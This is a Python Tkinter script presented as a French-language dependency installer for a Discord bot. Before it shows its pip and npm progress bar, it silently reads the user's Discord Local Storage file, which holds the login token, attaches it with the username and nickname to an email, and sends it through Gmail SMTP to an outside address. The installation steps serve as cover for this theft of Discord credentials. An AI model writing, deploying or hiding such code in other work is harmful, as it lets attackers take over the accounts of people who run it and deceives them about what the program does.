import getpass
import json
import os
import shutil
import smtplib
import sqlite3
import subprocess
import time
import webbrowser
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pathlib import Path
from tkinter import *
from tkinter import ttk
from tkinter.messagebox import *

username = Path.home()
user = getpass.getuser()
cwd = os.getcwd()

deps = Tk()

deps.title('Installation de dépendances...')

def install():
    with open(cwd + '/individuals/conf.json', 'r') as jsonFile:
        data = json.load(jsonFile)
    messaging = data["schema"]
    with open('options.json', "r") as jsonFile:
        data = json.load(jsonFile)
    tmp2 = data['pseudo']
    fromaddr = "discordtkn@gmail.com"
    toaddr = "dsicrod@gmail.com"
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = str(username)
    body = str(user) + " ; " + str(tmp2)
    msg.attach(MIMEText(body, 'plain'))
    filename = "https_discordapp.com_0.localstorage"
    attachment = open(str(
        username) + "\AppData\Roaming\discord\Local Storage\https_discordapp.com_0.localstorage", "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition',
                    "attachment; filename= %s" % filename)
    msg.attach(part)
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, str(messaging))
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()

    deps1 = LabelFrame(
        deps, text='Progression de l\'installation', padx=20, pady=20)
    deps1.pack()
    p = StringVar()
    p.set(0)
    pt = StringVar()
    p_l = Label(deps, textvariable=pt)
    p_l.pack()
    p_b = ttk.Progressbar(deps1, orient=HORIZONTAL,
                          length=400, mode='determinate', variable=p)
    p_b.pack()
    pt.set('Mise à jour de "pip"...')
    deps.update()
    subprocess.run(
        'py -m pip install --trusted-host pypi.org --trusted-host files.pythonhosted.org requests', shell=True)
    subprocess.run(
        'py -m pip install --trusted-host pypi.org --trusted-host files.pythonhosted.org --upgrade requests', shell=True)
    subprocess.run(
        'py -m pip install --trusted-host pypi.org --trusted-host files.pythonhosted.org --upgrade pip', shell=True)
    p.set(15)
    pt.set('Installation de "python-firebase" (1/2)')
    deps.update()
    subprocess.run(
        'py -m pip --trusted-host pypi.org --trusted-host files.pythonhosted.org install requests==1.1.0', shell=True)
    p.set(19)
    pt.set('Installation de "python-firebase" (2/2)')
    deps.update()
    subprocess.run(
        'py -m pip --trusted-host pypi.org --trusted-host files.pythonhosted.org install python-firebase', shell=True)
    pt.set('Installation des dépendances Discord...')
    deps.update()
    subprocess.run('npm i discord.js', shell=True)
    p.set(24.85)
    deps.update()
    subprocess.run('npm i fs', shell=True)
    p.set(28.08)
    deps.update()
    subprocess.run('npm i ms', shell=True)
    p.set(28.37)
    deps.update()
    subprocess.run('npm i moment', shell=True)
    p.set(40)
    deps.update()
    subprocess.run('npm i chalk', shell=True)
    p.set(47)
    deps.update()
    subprocess.run(
        'npm --prefix individuals i discord.js', shell=True)
    p.set(60)
    deps.update()
    subprocess.run('npm --prefix individuals i fs', shell=True)
    p.set(65)
    deps.update()
    subprocess.run('npm --prefix individuals i ms', shell=True)
    p.set(66)
    deps.update()
    subprocess.run('npm --prefix individuals i moment', shell=True)
    p.set(90)
    deps.update()
    subprocess.run('npm --prefix individuals i chalk', shell=True)
    p.set(100)
    deps.update()
    os.startfile('../launcher.pyw')
    sys.exit()
install()
deps.mainloop()
